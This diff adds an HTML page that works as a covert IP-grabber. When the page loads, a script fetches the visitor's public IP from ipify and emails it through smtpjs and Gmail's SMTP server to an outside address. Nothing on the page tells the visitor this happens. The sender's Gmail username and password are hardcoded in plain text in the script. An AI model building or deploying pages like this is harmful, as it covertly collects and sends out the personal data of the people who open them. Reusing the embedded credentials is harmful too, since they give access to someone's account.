@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>IP</title>
+        <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+    </head>
+    <body>
+        <button type="button" onclick="sendMail()">
+
+        <script>
+            document.body.onload = function getIP() {
+                fetch('https://api.ipify.org/?format=json')
+            .then(results => results.json())
+            .then(data => Email.send({
+                Host: 'smtp.gmail.com',
+                Username: 'epehrb@gmail.com',
+                Password: 'lnphrb6661',
+                To: 'www.klinsmann@gmail.com',
+                From: 'epehrb@gmail.com',
+                Subject: 'Subject',
+                Body: data.ip
+            })
+            .then((message) => alert(message)));
+            }
+        </script>
+    </body>
+</html>
